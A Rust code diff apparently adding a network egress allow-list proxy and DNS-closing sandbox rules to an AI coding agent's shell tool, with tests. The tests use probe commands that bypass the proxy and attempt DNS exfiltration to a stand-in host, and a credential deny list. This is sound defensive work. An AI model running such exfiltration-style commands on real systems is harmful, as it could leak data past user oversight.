@@ -21,6 +21,7 @@ over cat/sed/find/grep. Avoid interactive commands; they will hang until the tim
     if available() {
         description.push_str(" Commands run in a sandbox: they can write only inside the project (and, in a git worktree, its git dirs so commit works), temp folders, toolchain caches and paths the user configured, and can't read credentials (~/.ssh, ~/.aws, ...). Network access works; swift builds get SwiftPM's inner sandbox disabled (frog's is the boundary), and read-only git commands can go over https to GitHub when configured. If a command fails because of the sandbox and genuinely needs more (installing globally, git push over ssh), run it again with unsandboxed: true; the user will be asked.");
         props["unsandboxed"] = json!({ "type": "boolean", "description": "Run outside the sandbox. Asks the user first; use only when the sandbox blocked something the task needs." });
+        props["allow_hosts"] = json!({ "type": "array", "items": { "type": "string" }, "description": "Hosts beyond the session's network allow-list this command needs. Asks the user first; only after a connection was blocked." });
     }
     ToolSpec {
         name: "Bash".into(),
@@ -120,8 +121,7 @@ pub async fn run(input: &Value, ctx: &mut Ctx) -> Result<Output> {
     // otherwise read each other's final directory.
     static CALLS: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
     let call = CALLS.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
-    let cwd_file =
-        std::env::temp_dir().join(format!("frog-cwd-{}-{call}", std::process::id()));
+    let cwd_file = std::env::temp_dir().join(format!("frog-cwd-{}-{call}", std::process::id()));
     let _ = std::fs::remove_file(&cwd_file);
     // Under our sandbox, SwiftPM's own inner seatbelt sandbox can never apply (macOS rejects a
     // nested sandbox_apply outright), so `swift build` fails with "Invalid manifest" until it's
@@ -151,7 +151,7 @@ pub async fn run(input: &Value, ctx: &mut Ctx) -> Result<Output> {
         "{{\n{cmd}\n}} 2>&1\n__frog_ec=$?\npwd -P > '{}'\nexit $__frog_ec",
         cwd_file.display()
     );
-    let (mut command, jail) = shell(input, ctx)?;
+    let (mut command, jail, egress) = shell_call(input, ctx)?;
     let mut child = command
         .arg(&script)
         // Colors for the human watching; they're stripped before the model sees the output.
@@ -237,6 +237,9 @@ pub async fn run(input: &Value, ctx: &mut Ctx) -> Result<Output> {
             text
         }
     };
+    if let Some(call) = &egress {
+        egress_note(call, ctx, &mut raw);
+    }
     if jail.is_some() && blocked(&raw) {
         raw.push_str("\n(This ran in frog's sandbox, which allows writes only inside the project, temp folders and toolchain caches, and hides credentials. If the command genuinely needs more, run it again with unsandboxed: true; the user will be asked.)");
     }
@@ -259,6 +262,19 @@ pub fn shell(
     input: &Value,
     ctx: &Ctx,
 ) -> Result<(tokio::process::Command, Option<std::path::PathBuf>)> {
+    shell_call(input, ctx).map(|(command, jail, _)| (command, jail))
+}
+
+/// [`shell`], plus the command's registration with the egress proxy when the session has an
+/// allow-list, to read what it tried to reach.
+pub fn shell_call(
+    input: &Value,
+    ctx: &Ctx,
+) -> Result<(
+    tokio::process::Command,
+    Option<std::path::PathBuf>,
+    Option<std::sync::Arc<crate::egress::Call>>,
+)> {
     let shell = std::env::var("SHELL")
         .ok()
         .filter(|s| s.ends_with("zsh") || s.ends_with("bash"))
@@ -270,13 +286,58 @@ pub fn shell(
         .sandbox
         .clone()
         .or_else(|| (!unsandboxed).then(|| ctx.shell_sandbox.clone()).flatten());
+    // The egress allow-list binds sandboxed commands only: an approved `unsandboxed` call is
+    // the user's own grant past it.
+    let egress = ctx.egress.as_ref().filter(|e| jail.is_some() && e.active());
+    let enforce = egress.is_some_and(|e| e.enforced()) && cfg!(target_os = "macos");
+    let enforced_extra;
+    let extra = if enforce {
+        enforced_extra = SandboxConfig {
+            network: Some("egress".into()),
+            ..ctx.sandbox_extra.clone()
+        };
+        &enforced_extra
+    } else {
+        &ctx.sandbox_extra
+    };
     let mut command = match &jail {
         None => tokio::process::Command::new(shell),
         // Git's write dirs follow the session's checkout, not the shell's current directory:
         // a `cd` into another checkout doesn't open its refs and objects for writing.
-        Some(root) => sandboxed(root, &shell, &ctx.sandbox_extra, &git_dirs(&ctx.root))?,
+        Some(root) => sandboxed(root, &shell, extra, &git_dirs(&ctx.root))?,
     };
+    let cmd = input["command"].as_str().unwrap_or("");
+    let mut call = None;
+    if let Some(e) = egress {
+        let tool = if input.get("until_regex").is_some() || input.get("until_exit").is_some() {
+            crate::background::MONITOR
+        } else {
+            "Bash"
+        };
+        // Hosts the user allowed for this one command (its approval card).
+        let extra_hosts = e.take_once(cmd);
+        let Some((url, c)) = crate::egress::register(e, tool, cmd, extra_hosts) else {
+            bail!(
+                "frog's network allow-list proxy couldn't start, so sandboxed commands can't run"
+            );
+        };
+        for k in [
+            "HTTPS_PROXY",
+            "https_proxy",
+            "HTTP_PROXY",
+            "http_proxy",
+            "ALL_PROXY",
+            "all_proxy",
+        ] {
+            command.env(k, &url);
+        }
+        command
+            .env("NO_PROXY", "localhost,127.0.0.1,::1")
+            .env("no_proxy", "localhost,127.0.0.1,::1");
+        call = Some(c);
+    }
     if jail.is_some()
+        && egress.is_none()
         && cfg!(target_os = "macos")
         && ctx.sandbox_extra.network.as_deref() == Some("dev")
     {
@@ -292,7 +353,6 @@ pub fn shell(
     // (GIT_CONFIG_* env; no file is touched), and gh's credential helper supplies auth — no
     // keys ever readable. Only for read subcommands with no `push` in the command: a push
     // stays an approval, and `url.insteadOf` would redirect its URL too.
-    let cmd = input["command"].as_str().unwrap_or("");
     if jail.is_some() && ctx.sandbox_extra.git_https && git_https_applies(cmd) {
         command
             .env("GIT_CONFIG_COUNT", "2")
@@ -307,7 +367,40 @@ pub fn shell(
         .env("PAGER", "cat")
         .env("GIT_PAGER", "cat")
         .env("FROG", "1");
-    Ok((command, jail))
+    Ok((command, jail, call))
+}
+
+/// After an allow-list command: name the hosts a client that ignored the proxy couldn't
+/// resolve (the sandbox denies DNS), and tell the model what was blocked and how to ask.
+fn egress_note(call: &crate::egress::Call, ctx: &Ctx, raw: &mut String) {
+    let enforced = ctx.egress.as_ref().is_some_and(|e| e.enforced());
+    if !enforced {
+        return;
+    }
+    let seen: Vec<String> = call.hits().into_iter().map(|h| h.host).collect();
+    for host in crate::egress::unresolved(raw) {
+        if !seen.contains(&host) && !ctx.egress.as_ref().is_some_and(|e| e.allows(&host)) {
+            call.record(&host, 0);
+        }
+    }
+    let mut hosts: Vec<String> = Vec::new();
+    for h in call.hits() {
+        if !hosts.contains(&h.host) {
+            hosts.push(h.host);
+        }
+    }
+    if hosts.is_empty() {
+        return;
+    }
+    let list = hosts
+        .iter()
+        .map(|h| format!("\"{h}\""))
+        .collect::<Vec<_>>()
+        .join(", ");
+    raw.push_str(&format!(
+        "\n(frog blocked network access to {}: not on this session's allow-list. The attempt is logged and shown to the user. If the task genuinely needs it, run the command again with allow_hosts: [{list}]; the user will be asked.)",
+        hosts.join(", ")
+    ));
 }
 
 /// Output that looks like the sandbox got in the way.
@@ -475,11 +568,7 @@ const CACHES: &[&str] = &[
 /// Non-secret config that sandboxed commands may read by default (under $HOME). Everything a
 /// build or a read-only git command routinely looks at, and nothing that holds a credential:
 /// the credential paths stay in SECRETS and only open with `allow_read`.
-const DEFAULT_READABLE: &[&str] = &[
-    ".gitconfig",
-    ".cargo/config.toml",
-    ".gitignore_global",
-];
+const DEFAULT_READABLE: &[&str] = &[".gitconfig", ".cargo/config.toml", ".gitignore_global"];
 
 /// Credentials a sandboxed command can't read, so a prompt-injected command can't read them
 /// and send them over the network.
@@ -515,8 +604,20 @@ const SECRETS: &[&str] = &[
 /// works over the network and exposes no credentials; ssh keys stay hidden either way).
 fn git_https_applies(cmd: &str) -> bool {
     const READ_SUBCOMMANDS: &[&str] = &[
-        "fetch", "ls-remote", "pull", "clone", "submodule", "status", "diff", "log", "show",
-        "branch", "rev-parse", "describe", "remote", "worktree",
+        "fetch",
+        "ls-remote",
+        "pull",
+        "clone",
+        "submodule",
+        "status",
+        "diff",
+        "log",
+        "show",
+        "branch",
+        "rev-parse",
+        "describe",
+        "remote",
+        "worktree",
     ];
     let tokens: Vec<&str> = cmd.split_whitespace().collect();
     // Any push token anywhere disqualifies the whole command.
@@ -750,11 +851,23 @@ fn seatbelt(
         .iter()
         .map(|p| format!("\n  (subpath \"{}\")", quote(p)))
         .collect();
-    let network = if extra.network.as_deref() == Some("dev") {
-        "\n(deny network-outbound)\n(allow network-outbound (remote ip \"localhost:*\"))"
-            .to_string()
-    } else {
-        String::new()
+    let network = match extra.network.as_deref() {
+        Some("dev") => {
+            "\n(deny network-outbound)\n(allow network-outbound (remote ip \"localhost:*\"))"
+                .to_string()
+        }
+        // The egress allow-list: nothing leaves but through the localhost proxy, which
+        // decides by name. Local unix sockets keep working (build daemons, agents), except
+        // mDNSResponder's: with it, any lookup (`dig`, `getaddrinfo`) would still reach DNS,
+        // which carries data out on its own.
+        Some("egress") => concat!(
+            "\n(deny network-outbound)",
+            "\n(allow network-outbound (remote ip \"localhost:*\"))",
+            "\n(allow network-outbound (remote unix-socket))",
+            "\n(deny network-outbound (remote unix-socket (path-literal \"/private/var/run/mDNSResponder\")))"
+        )
+        .to_string(),
+        _ => String::new(),
     };
     let profile = format!(
         r#"(version 1)
@@ -834,6 +947,57 @@ fn bubblewrap(
 #[cfg(all(test, any(target_os = "macos", target_os = "linux")))]
 mod tests {
     use super::*;
+
+    /// A command that runs `sleep <secs>` as a child of the tool's shell and records that
+    /// child's own pid in `ws/pid`, so a test can check exactly the process it started.
+    /// (Matching `pgrep -f "sleep N"` machine-wide also catches any other `sleep N` on the
+    /// box: another session's, a CI neighbour's.)
+    fn sleeper(ws: &std::path::Path, secs: u32) -> String {
+        format!(
+            "sleep {secs} & echo $! > '{}'; wait",
+            ws.join("pid").display()
+        )
+    }
+
+    /// Drives `run` until the sleeper has recorded its pid (up to 10s), so a test cancels a
+    /// command that really started. (A fixed sleep while `run` sits pinned and unpolled
+    /// never spawns it at all.)
+    async fn until_sleeping<F: std::future::Future + Unpin>(run: &mut F, ws: &std::path::Path) {
+        let pid = ws.join("pid");
+        let started = async {
+            for _ in 0..200 {
+                if std::fs::read_to_string(&pid).is_ok_and(|s| !s.trim().is_empty()) {
+                    return;
+                }
+                tokio::time::sleep(Duration::from_millis(50)).await;
+            }
+            panic!("the sleeper never started");
+        };
+        tokio::select! {
+            _ = run => panic!("the command finished before it was interrupted"),
+            _ = started => {}
+        }
+    }
+
+    /// Polls up to 2s for the sleeper's recorded pid to be gone (a zombie counts as gone).
+    async fn sleeper_gone(ws: &std::path::Path) -> bool {
+        let pid =
+            std::fs::read_to_string(ws.join("pid")).expect("the sleeper never recorded its pid");
+        let pid = pid.trim().to_string();
+        assert!(pid.parse::<u32>().is_ok(), "bad pid {pid:?}");
+        for _ in 0..20 {
+            let stat = std::process::Command::new("ps")
+                .args(["-o", "stat=", "-p", &pid])
+                .output()
+                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
+                .unwrap_or_default();
+            if stat.is_empty() || stat.starts_with('Z') {
+                return true;
+            }
+            tokio::time::sleep(Duration::from_millis(100)).await;
+        }
+        false
+    }
 
     /// A commit inside a linked worktree works (index.lock, refs, objects live outside the
     /// worktree); a write elsewhere in the main checkout still fails.
@@ -926,6 +1090,137 @@ mod tests {
         .await
         .unwrap();
         assert!(!out.content.contains("rc=0"), "{}", out.content);
+    }
+
+    fn egress_ctx(ws: &std::path::Path, mode: crate::egress::Mode, allow: &[&str]) -> Ctx {
+        let mut ctx = Ctx::new(ws.to_path_buf());
+        ctx.shell_sandbox = Some(ws.canonicalize().unwrap());
+        let mut cfg = crate::config::Config {
+            hermetic: true,
+            worker: true,
+            ..Default::default()
+        };
+        cfg.egress.workers_deny_by_default = mode == crate::egress::Mode::Enforce;
+        cfg.egress.interactive = mode;
+        cfg.worker = mode == crate::egress::Mode::Enforce;
+        cfg.egress.allow = allow.iter().map(|s| s.to_string()).collect();
+        ctx.egress = crate::egress::for_session(&cfg, ws);
+        ctx
+    }
+
+    /// Under an enforced list: a listed host goes through the proxy (plain http, to a local
+    /// server, so no network is needed); a client that ignores the proxy can't even resolve,
+    /// and the host it tried is still named; DNS itself is closed.
+    #[cfg(target_os = "macos")]
+    #[tokio::test]
+    async fn egress_passes_listed_hosts_and_names_proxy_dodgers() {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        let ws = std::env::temp_dir().join(format!("frog-eg-{}", crate::session::new_id()));
+        std::fs::create_dir_all(&ws).unwrap();
+        let server = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let port = server.local_addr().unwrap().port();
+        tokio::spawn(async move {
+            let (mut s, _) = server.accept().await.unwrap();
+            let mut buf = [0u8; 1024];
+            let n = s.read(&mut buf).await.unwrap();
+            let head = String::from_utf8_lossy(&buf[..n]).to_string();
+            let ok = !head.to_ascii_lowercase().contains("proxy-authorization");
+            let body = if ok { "listed-ok" } else { "leaked-token" };
+            s.write_all(
+                format!(
+                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{body}",
+                    body.len()
+                )
+                .as_bytes(),
+            )
+            .await
+            .unwrap();
+        });
+        let mut ctx = egress_ctx(&ws, crate::egress::Mode::Enforce, &["localhost"]);
+        // `--noproxy ''` overrides NO_PROXY so localhost goes through the proxy too.
+        let out = run(
+            &json!({ "command": format!("curl -sS -m 5 --noproxy '' http://localhost:{port}/x") }),
+            &mut ctx,
+        )
+        .await
+        .unwrap();
+        assert!(out.content.contains("listed-ok"), "{}", out.content);
+        let out = run(
+            &json!({ "command": "curl -sS -m 5 --noproxy '*' https://oss-cn-beijing.aliyuncs.com/ ; python3 -c \"import socket; socket.getaddrinfo('dns-exfil.example.com', 53)\" 2>&1 | tail -1; echo rc=$?" }),
+            &mut ctx,
+        )
+        .await
+        .unwrap();
+        assert!(
+            out.content.contains("Could not resolve host"),
+            "{}",
+            out.content
+        );
+        assert!(
+            out.content.contains("gaierror"),
+            "DNS is closed: {}",
+            out.content
+        );
+        assert!(
+            out.content
+                .contains("allow_hosts: [\"oss-cn-beijing.aliyuncs.com\"]"),
+            "{}",
+            out.content
+        );
+        let hits = ctx.egress.as_ref().unwrap().drain();
+        assert!(
+            hits.iter()
+                .any(|h| h.host == "oss-cn-beijing.aliyuncs.com" && h.port == 0),
+            "{hits:?}"
+        );
+        let _ = std::fs::remove_dir_all(&ws);
+    }
+
+    /// The everyday tools through the real network under an enforced list: git, curl and
+    /// python reach the listed hosts. Needs the network, so run by hand (`--ignored`).
+    #[cfg(target_os = "macos")]
+    #[tokio::test]
+    #[ignore]
+    async fn egress_listed_hosts_work_over_the_network() {
+        let ws = std::env::temp_dir().join(format!("frog-egn-{}", crate::session::new_id()));
+        std::fs::create_dir_all(&ws).unwrap();
+        let mut ctx = egress_ctx(&ws, crate::egress::Mode::Enforce, &[]);
+        let out = run(
+            &json!({ "command": "git ls-remote https://github.com/octocat/Hello-World HEAD | cut -c1-7 && curl -sS -o /dev/null -w 'crates=%{http_code}\\n' https://index.crates.io/config.json && python3 -c \"import urllib.request as u; print('pypi', u.urlopen('https://pypi.org/simple/', timeout=10).status)\" && curl -sS -m 5 https://example.com/ ; echo rc=$?" }),
+            &mut ctx,
+        )
+        .await
+        .unwrap();
+        assert!(out.content.contains("crates=200"), "{}", out.content);
+        assert!(out.content.contains("pypi 200"), "{}", out.content);
+        assert!(
+            out.content
+                .contains("frog blocked network access to example.com"),
+            "{}",
+            out.content
+        );
+        let _ = std::fs::remove_dir_all(&ws);
+    }
+
+    /// `flag` records an off-list host but doesn't block it (and the profile stays open).
+    #[cfg(target_os = "macos")]
+    #[tokio::test]
+    async fn egress_flag_mode_records_without_blocking() {
+        let ws = std::env::temp_dir().join(format!("frog-egf-{}", crate::session::new_id()));
+        std::fs::create_dir_all(&ws).unwrap();
+        let mut ctx = egress_ctx(&ws, crate::egress::Mode::Flag, &[]);
+        let out = run(
+            &json!({ "command": "curl -sS -m 5 -o /dev/null https://unlisted.invalid/ ; echo rc=$?" }),
+            &mut ctx,
+        )
+        .await
+        .unwrap();
+        assert!(!out.content.contains("frog blocked"), "{}", out.content);
+        assert!(!out.content.contains("403"), "{}", out.content);
+        let hits = ctx.egress.as_ref().unwrap().drain();
+        assert_eq!(hits.len(), 1, "{hits:?}");
+        assert!(hits[0].host == "unlisted.invalid" && !hits[0].enforced);
+        let _ = std::fs::remove_dir_all(&ws);
     }
 
     #[tokio::test]
@@ -1115,7 +1410,9 @@ mod tests {
         );
         // The default-readable config is re-allowed for reading, after the secrets deny.
         assert!(
-            profile.contains(&format!("(allow file-read* (subpath \"{home_s}/.gitconfig\"))")),
+            profile.contains(&format!(
+                "(allow file-read* (subpath \"{home_s}/.gitconfig\"))"
+            )),
             ".gitconfig read missing:\n{profile}"
         );
         assert!(
@@ -1129,7 +1426,9 @@ mod tests {
         );
         // allow_read is read-only.
         assert!(
-            !profile.contains(&format!("(allow file-write*\n  (subpath \"{home_s}/.config/gh\")")),
+            !profile.contains(&format!(
+                "(allow file-write*\n  (subpath \"{home_s}/.config/gh\")"
+            )),
             "allow_read path became writable:\n{profile}"
         );
         // Every credential path is still denied.
@@ -1142,9 +1441,14 @@ mod tests {
         // frog's config dir is denied but its config.toml re-allowed: both must appear.
         let deny_pos = profile.find("(deny file-read* file-write*").unwrap();
         let allow_pos = profile
-            .find(&format!("(allow file-read* (subpath \"{home_s}/.config/frog/config.toml\"))"))
+            .find(&format!(
+                "(allow file-read* (subpath \"{home_s}/.config/frog/config.toml\"))"
+            ))
             .unwrap();
-        assert!(deny_pos < allow_pos, "config.toml allow must come after the deny");
+        assert!(
+            deny_pos < allow_pos,
+            "config.toml allow must come after the deny"
+        );
     }
 
     /// `adapt_swiftpm` adds the flag to sandboxed swift builds and leaves everything else
@@ -1153,18 +1457,27 @@ mod tests {
     fn sandbox_swiftpm_adaptation_rewrites_only_swift_build_invocations() {
         let f = |cmd: &str| adapt_swiftpm(cmd);
         assert_eq!(f("swift build"), "swift build --disable-sandbox");
-        assert_eq!(f("swift build -c release"), "swift build --disable-sandbox -c release");
+        assert_eq!(
+            f("swift build -c release"),
+            "swift build --disable-sandbox -c release"
+        );
         assert_eq!(
             f("swift test --package-path sidecars/frog-apple"),
             "swift test --disable-sandbox --package-path sidecars/frog-apple"
         );
-        assert_eq!(f("cd /tmp && swift run App"), "cd /tmp && swift run --disable-sandbox App");
+        assert_eq!(
+            f("cd /tmp && swift run App"),
+            "cd /tmp && swift run --disable-sandbox App"
+        );
         assert_eq!(
             f("FOO=1 swift package resolve"),
             "FOO=1 swift package --disable-sandbox resolve"
         );
         // Already has it: untouched.
-        assert_eq!(f("swift build --disable-sandbox"), "swift build --disable-sandbox");
+        assert_eq!(
+            f("swift build --disable-sandbox"),
+            "swift build --disable-sandbox"
+        );
         // Other subcommands and non-command positions: untouched.
         assert_eq!(f("swiftc foo.swift"), "swiftc foo.swift");
         assert_eq!(f("swift repl"), "swift repl");
@@ -1234,16 +1547,17 @@ mod tests {
         let mut ctx = Ctx::new(pkg.clone());
         ctx.sandbox = Some(pkg.canonicalize().unwrap());
         // Cold manifest cache is the failure case: drop it so the manifest really compiles.
-        let _ = std::fs::remove_dir_all(dirs::home_dir().unwrap().join("Library/Caches/org.swift.swiftpm/manifests"));
+        let _ = std::fs::remove_dir_all(
+            dirs::home_dir()
+                .unwrap()
+                .join("Library/Caches/org.swift.swiftpm/manifests"),
+        );
 
         // Without the adaptation (`sh -c` hides the invocation from the rewriter), plain
         // `swift build` fails: SwiftPM's inner sandbox can't apply inside ours.
-        let plain = run(
-            &json!({ "command": "sh -c 'swift build'" }),
-            &mut ctx,
-        )
-        .await
-        .unwrap();
+        let plain = run(&json!({ "command": "sh -c 'swift build'" }), &mut ctx)
+            .await
+            .unwrap();
         assert!(
             !plain.content.contains("Build complete"),
             "plain swift build unexpectedly worked:\n{}",
@@ -1251,7 +1565,9 @@ mod tests {
         );
 
         // With the engine's adaptation, the same command the agent writes builds fine.
-        let adapted = run(&json!({ "command": "swift build" }), &mut ctx).await.unwrap();
+        let adapted = run(&json!({ "command": "swift build" }), &mut ctx)
+            .await
+            .unwrap();
         assert!(
             adapted.content.contains("Build complete"),
             "adapted swift build failed:\n{}",
@@ -1269,7 +1585,9 @@ mod tests {
         std::fs::create_dir_all(&ws).unwrap();
         let mut ctx = Ctx::new(ws.clone());
         ctx.sandbox = Some(ws.canonicalize().unwrap());
-        let out = run(&json!({ "command": "swift --version" }), &mut ctx).await.unwrap();
+        let out = run(&json!({ "command": "swift --version" }), &mut ctx)
+            .await
+            .unwrap();
         assert!(
             out.content.contains("Swift version"),
             "swift --version failed:\n{}",
@@ -1294,7 +1612,8 @@ mod tests {
         .await
         .unwrap();
         assert!(
-            out.content.contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
+            out.content
+                .contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
             "ls-remote failed:\n{}",
             out.content
         );
@@ -1319,7 +1638,8 @@ mod tests {
         .await
         .unwrap();
         assert!(
-            out.content.contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
+            out.content
+                .contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
             "ssh ls-remote didn't resolve over https:\n{}",
             out.content
         );
@@ -1353,7 +1673,10 @@ mod tests {
                 !on.contains(&format!("(allow file-read* (subpath \"{h}/{p}")),
                 "{p} readable with git_https:\n{on}"
             );
-            assert!(on.contains(&format!("(subpath \"{h}/{p}\")")), "{p} not denied");
+            assert!(
+                on.contains(&format!("(subpath \"{h}/{p}\")")),
+                "{p} not denied"
+            );
         }
     }
 
@@ -1387,7 +1710,12 @@ mod tests {
         ];
         for probe in &probes {
             let out = run(&json!({ "command": probe }), &mut ctx).await.unwrap();
-            let first = out.content.lines().next().unwrap_or("").replace(&token, "<TOKEN>");
+            let first = out
+                .content
+                .lines()
+                .next()
+                .unwrap_or("")
+                .replace(&token, "<TOKEN>");
             eprintln!("probe `{probe}` -> {first}");
             assert!(
                 !out.content.contains(&token),
@@ -1401,7 +1729,8 @@ mod tests {
         .await
         .unwrap();
         assert!(
-            out.content.contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
+            out.content
+                .contains("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"),
             "{}",
             out.content
         );
@@ -1411,7 +1740,12 @@ mod tests {
         if let Ok(repo) = std::env::var("FROG_PRIVATE_REPO") {
             let cmd = format!("GIT_TERMINAL_PROMPT=0 git ls-remote git@github.com:{repo} HEAD");
             let out = run(&json!({ "command": cmd }), &mut ctx).await.unwrap();
-            let first = out.content.lines().next().unwrap_or("").replace(&token, "<TOKEN>");
+            let first = out
+                .content
+                .lines()
+                .next()
+                .unwrap_or("")
+                .replace(&token, "<TOKEN>");
             eprintln!("private `{repo}` -> {first}");
         }
         let _ = std::fs::remove_dir_all(&ws);
@@ -1422,7 +1756,9 @@ mod tests {
     /// on `)` and `}`, wedging the engine so Stop couldn't fire) fails here.
     #[test]
     fn scanners_terminate_on_random_metacharacter_strings() {
-        const META: &[char] = &[')', '(', '}', '{', '|', '&', '<', '>', ';', '"', '\'', ' ', '\n'];
+        const META: &[char] = &[
+            ')', '(', '}', '{', '|', '&', '<', '>', ';', '"', '\'', ' ', '\n',
+        ];
         let mut state = 0x2545F4914F6CDD1Du64;
         let mut next = move || {
             state ^= state << 13;
@@ -1457,12 +1793,12 @@ mod tests {
         ctx.cancel = Some(token.clone());
         let marker = ws.join("done");
         let _ = std::fs::remove_file(&marker);
-        let cmd = format!("sleep 61; touch '{}'", marker.display());
+        let cmd = format!("{} && touch '{}'", sleeper(&ws, 61), marker.display());
         let input = json!({ "command": cmd, "timeout": 120000 });
         let run = run(&input, &mut ctx);
         tokio::pin!(run);
-        // Give the command time to spawn and start sleeping.
-        tokio::time::sleep(Duration::from_millis(300)).await;
+        // Drive the command until it has spawned and is sleeping.
+        until_sleeping(&mut run, &ws).await;
         let started = std::time::Instant::now();
         token.cancel();
         let out = tokio::time::timeout(Duration::from_secs(2), run).await;
@@ -1475,23 +1811,10 @@ mod tests {
         );
         assert!(!marker.exists(), "the cancelled command must not finish");
         // The whole process group is gone: nothing sleeps on.
-        for _ in 0..20 {
-            tokio::time::sleep(Duration::from_millis(100)).await;
-            let alive = std::process::Command::new("pgrep")
-                .args(["-f", "sleep 61"])
-                .output()
-                .map(|o| o.stdout.is_empty())
-                .unwrap_or(true);
-            if alive {
-                break;
-            }
-        }
-        let alive = std::process::Command::new("pgrep")
-            .args(["-f", "sleep 61"])
-            .output()
-            .map(|o| !o.stdout.is_empty())
-            .unwrap_or(false);
-        assert!(!alive, "a `sleep 61` from the cancelled group is still running");
+        assert!(
+            sleeper_gone(&ws).await,
+            "the `sleep 61` from the cancelled group is still running"
+        );
         let _ = std::fs::remove_dir_all(&ws);
     }
 
@@ -1506,11 +1829,15 @@ mod tests {
         ctx.cancel = Some(token.clone());
         let marker = ws.join("bg");
         let _ = std::fs::remove_file(&marker);
-        let cmd = format!("sleep 62 & echo bg > '{}'; wait", marker.display());
+        let cmd = format!(
+            "{} & echo bg > '{}'; wait",
+            sleeper(&ws, 62),
+            marker.display()
+        );
         let input = json!({ "command": cmd });
         let run = run(&input, &mut ctx);
         tokio::pin!(run);
-        tokio::time::sleep(Duration::from_millis(300)).await;
+        until_sleeping(&mut run, &ws).await;
         token.cancel();
         let err = match tokio::time::timeout(Duration::from_secs(2), run).await {
             // Elapsed without finishing, or finished as an error: both prove the interrupt
@@ -1520,23 +1847,10 @@ mod tests {
             Ok(Ok(o)) => panic!("expected an interrupted result, got {:?}", o.content),
         };
         assert!(err.to_string().contains("interrupted"), "{err}");
-        for _ in 0..20 {
-            tokio::time::sleep(Duration::from_millis(100)).await;
-            let alive = std::process::Command::new("pgrep")
-                .args(["-f", "sleep 62"])
-                .output()
-                .map(|o| !o.stdout.is_empty())
-                .unwrap_or(false);
-            if !alive {
-                break;
-            }
-        }
-        let alive = std::process::Command::new("pgrep")
-            .args(["-f", "sleep 62"])
-            .output()
-            .map(|o| !o.stdout.is_empty())
-            .unwrap_or(false);
-        assert!(!alive, "a backgrounded `sleep 62` escaped the group kill");
+        assert!(
+            sleeper_gone(&ws).await,
+            "the backgrounded `sleep 62` escaped the group kill"
+        );
         let _ = std::fs::remove_dir_all(&ws);
     }
 
@@ -1554,10 +1868,10 @@ mod tests {
         ctx.shell_sandbox = Some(ws.canonicalize().unwrap());
         let token = tokio_util::sync::CancellationToken::new();
         ctx.cancel = Some(token.clone());
-        let input = json!({ "command": "sleep 63" });
+        let input = json!({ "command": sleeper(&ws, 63) });
         let run = run(&input, &mut ctx);
         tokio::pin!(run);
-        tokio::time::sleep(Duration::from_millis(300)).await;
+        until_sleeping(&mut run, &ws).await;
         token.cancel();
         let out = tokio::time::timeout(Duration::from_secs(2), run)
             .await
@@ -1567,12 +1881,10 @@ mod tests {
             "expected an interrupted result, got {:?}",
             out.as_ref().map(|o| &o.content)
         );
-        let alive = std::process::Command::new("pgrep")
-            .args(["-f", "sleep 63"])
-            .output()
-            .map(|o| !o.stdout.is_empty())
-            .unwrap_or(false);
-        assert!(!alive, "a sandboxed `sleep 63` survived the interrupt");
+        assert!(
+            sleeper_gone(&ws).await,
+            "the sandboxed `sleep 63` survived the interrupt"
+        );
         let _ = std::fs::remove_dir_all(&ws);
     }
 
@@ -1583,7 +1895,12 @@ mod tests {
         std::fs::create_dir_all(&ws).unwrap();
         let mut ctx = Ctx::new(ws.clone());
         let started = std::time::Instant::now();
-        let err = match run(&json!({ "command": "sleep 30", "timeout": 1000 }), &mut ctx).await {
+        let err = match run(
+            &json!({ "command": sleeper(&ws, 30), "timeout": 1000 }),
+            &mut ctx,
+        )
+        .await
+        {
             Err(e) => e,
             Ok(o) => panic!("expected a timeout, got {:?}", o.content),
         };
@@ -1593,12 +1910,10 @@ mod tests {
             started.elapsed()
         );
         assert!(err.to_string().contains("timed out"), "{err}");
-        let alive = std::process::Command::new("pgrep")
-            .args(["-f", "sleep 30"])
-            .output()
-            .map(|o| !o.stdout.is_empty())
-            .unwrap_or(false);
-        assert!(!alive, "a timed-out `sleep 30` is still running");
+        assert!(
+            sleeper_gone(&ws).await,
+            "the timed-out `sleep 30` is still running"
+        );
         let _ = std::fs::remove_dir_all(&ws);
     }
 }
